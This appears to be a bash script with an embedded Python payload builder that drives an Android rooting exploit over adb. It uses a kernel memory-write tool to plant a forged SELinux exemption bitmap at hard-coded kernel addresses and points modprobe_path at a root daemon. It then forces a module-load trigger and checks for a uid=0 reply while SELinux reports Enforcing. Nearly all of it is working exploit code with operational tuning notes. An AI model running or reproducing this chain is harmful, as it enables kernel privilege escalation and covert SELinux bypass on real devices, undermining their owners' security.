#!/usr/bin/env bash
# Bootstrap the su daemon under ENFORCING, by per-domain exemption only.
#
# Fixes over the previous version (all three were measured failure causes):
#  1. one trigger only: socktrig takes an argument, so request_module() runs once
#     (each failed protocol used to spawn another daemon -> bind EADDRINUSE),
#  2. every sud pid dies, not just $PPID: the daemon double-forks and its
#     connection handlers are fork-only children, so they kept holding 12345/12346,
#  3. the exemption bitmap is built from the type values parsed out of the loaded
#     policy (fw/policy.running, same bytes as the ramdisk sepolicy) instead of an
#     all-ones carpet: qti_init_shell=241, kernel=164, init=494, untrusted_app=627,
#     shell=905, highest type seen=1014 (so 3 nodes = 1152 bits is enough).
set -u
SER=${1:-3e5a38a5}
ADB="adb -s $SER"
D=/data/local/tmp
NODE_BASE=${NODE_BASE:-0xffffffc001635a78}
PERM_HEAD=${PERM_HEAD:-0xffffffc00189f4d0}
MODPROBE=0xffffffc001635a30
# shell(905) is deliberately NOT exempt by default, so adb shell stays a live
# negative control proving Enforcing still binds domains outside the map.
BITS=${EXEMPT:-164,241,494,627}
[ "${EXEMPT_SHELL:-0}" = 1 ] && BITS="$BITS,905"

$ADB get-state >/dev/null 2>&1 || { echo "ABORT: no adb"; exit 2; }
[ "$($ADB shell getenforce 2>/dev/null | tr -d '\r')" = Permissive ] \
	|| { echo "ABORT: start from Permissive (am startservice com.xplay6.temproot/.EscService)"; exit 2; }
$ADB forward tcp:12345 tcp:12345 >/dev/null 2>&1
run() { { printf '%s\n' "$1"; sleep "$2"; } | timeout $((40 + $2)) bash -c \
	'exec 3<>/dev/tcp/127.0.0.1/12345; cat >&3; cat <&3' 2>/dev/null | tr -d '\r'; }
run 'echo PRE-OK' 6 | grep -q PRE-OK || { echo "ABORT: channel not live"; exit 3; }

eval "$(NODE_BASE=$NODE_BASE HEAD_ADDR=$PERM_HEAD BITS=$BITS python3 - <<'PY'
import os, struct
base=int(os.environ["NODE_BASE"],16); head=int(os.environ["HEAD_ADDR"],16)
bits=[int(x) for x in os.environ["BITS"].split(",") if x]
SZ=384; NODES=(max(bits)//SZ)+1
assert NODES <= 4, "need %d nodes, modprobe_path tail holds 4" % NODES
nodes=[]
for i in range(NODES):
    maps=[0]*6
    for b in bits:
        if b//SZ==i:
            off=b-i*SZ; maps[off//64]|=1<<(off%64)
    nodes.append([0,maps,i*SZ])
for i in range(NODES-1):
    nodes[i][0]=base+64*(i+1)
def get_bit(e):
    if e > max(bits): return 0                    # kernel: e > highbit -> 0
    for nxt,maps,sbit in nodes:
        if sbit <= e < sbit+SZ:
            off=e-sbit; return (maps[off//64]>>(off%64))&1
    return 0
for b in bits: assert get_bit(b)==1, b
for b in (300, 700, 1000, 1151): assert get_bit(b)==0, b
blob=b""
for nxt,maps,sbit in nodes:
    n=struct.pack("<Q",nxt)+b"".join(struct.pack("<Q",m) for m in maps)+struct.pack("<I",sbit)
    assert len(n)==60; blob+=n+b"\0"*4
headb=struct.pack("<Q",base)+struct.pack("<I",max(bits))+struct.pack("<I",0)
assert len(headb)==16, len(headb)
print("NODE_HEX="+blob.hex()); print("HEAD_HEX="+headb.hex())
print("MAPINFO=nodes=%d bytes=%d highbit=%d bits=%s"%(NODES,len(blob),max(bits),",".join(str(b) for b in bits)))
PY
)"
[ -n "${NODE_HEX:-}" ] && [ -n "${HEAD_HEX:-}" ] || { echo "ABORT: payload generation failed"; exit 4; }
echo "  $MAPINFO  (unexempted control bits 300/700/1000/1151 verified 0 locally)"

echo "=== 1. plant map, drain avc, point modprobe at sudC, flip enforcing"
run "cp $D/sudD $D/sudC; chmod 755 $D/sudC; chcon u:object_r:shell_data_file:s0 $D/sudC; \
	rm -rf $D/np; mkdir -p $D/np; chcon u:object_r:radio_data_file:s0 $D/np; touch $D/np/f; chmod 777 $D/np $D/np/f; \
/data/local/tmp/clobber 14 kern $NODE_BASE hex:$NODE_HEX | grep -c 'PRIMITIVE WORKS'; \
/data/local/tmp/clobber 14 kern $PERM_HEAD hex:$HEAD_HEX | grep -c 'PRIMITIVE WORKS'; \
echo 0 > /sys/fs/selinux/avc/cache_threshold; rm -f $D/sud.stage; echo STAGE-CLEARED" 30 | tail -1
run "N=0; for TY in \$(cat $D/typelist.txt); do chcon u:object_r:\$TY:s0 $D/nd/f 2>/dev/null && stat $D/nd/f >/dev/null 2>&1 && N=\$((N+1)); done; echo PURGED=\$N" 120 | grep PURGED
run "/data/local/tmp/clobber 14 kern $MODPROBE str:$D/sudC 4 0 | grep -c 'PRIMITIVE WORKS'; cat /proc/sys/kernel/modprobe; echo 1 > /sys/fs/selinux/enforce; id -Z" 25 | tail -2

echo "=== 2. kill every sud (not just the parent) and prove the ports are free"
run 'P=""; for X in /proc/[0-9]*; do C=$(cat $X/comm 2>/dev/null) || continue; \
	case "$C" in sud) P="$P ${X#/proc/}";; esac; done; echo "SUD-PIDS:$P"; \
	for K in $P; do [ $K -ne $$ ] && kill -9 $K; done; sleep 2; \
	netstat -ltn 2>/dev/null | grep -cE ":1234[56]"' 20 | tr '\n' ' ' | sed 's/^/  /'
echo

echo "=== 3. one file-less trigger, from the exempt daemon shell"
run '/data/local/tmp/socktrig once; echo TRIG-SENT' 25 | sed 's/^/  /'

echo "=== 4. verdict (needs Enforcing + a listener + a root reply)"
sleep 6
L=$($ADB shell 'netstat -ltn 2>/dev/null | grep -cE ":1234[56]"' 2>/dev/null | tr -d '\r')
G=$($ADB shell 'getenforce' 2>/dev/null | tr -d '\r')
S=$($ADB shell 'cat /data/local/tmp/sud.stage 2>&1 | tail -4' 2>/dev/null | tr -d '\r' | tr '\n' '|')
R=$(timeout 30 $ADB shell '/data/local/tmp/sux -c id 2>&1' 2>/dev/null | tr -d '\r' | head -1)
N=$($ADB shell "stat $D/np/f 2>&1" 2>/dev/null | tr -d '\r' | head -1)
echo "  getenforce=$G listeners=$L"
echo "  stage=$S"
echo "  suid reply=$R"
case "$N" in *denied*|*Permission*) echo "  confined shell on $D/np/f: REFUSED => Enforcing binds non-exempt domains";; *) echo "  confined shell: ALLOWED => (no control: shell is in the exempt set)";; esac
case "$G$L$R" in
  Enforcing0*uid=0*) echo "  RESULT: kmod-started daemon is up under Enforcing => PASS";;
  Enforcing[1-9]*uid=0*) echo "  RESULT: PASS (listeners up, daemon replied)";;
  *) echo "  RESULT: FAIL -- see stage line above (no 'start pid=' => exec never ran; errno=98 => port still held)";;
esac

echo "=== 5. restore"
timeout 30 $ADB shell am startservice -n com.xplay6.temproot/.EscService >/dev/null 2>&1
i=0; while [ $i -lt 20 ]; do sleep 5; i=$((i+1)); G=$($ADB shell getenforce 2>/dev/null | tr -d '\r'); [ "$G" = Permissive ] && break; done
echo "  after restore: $G ($((i*5))s)"
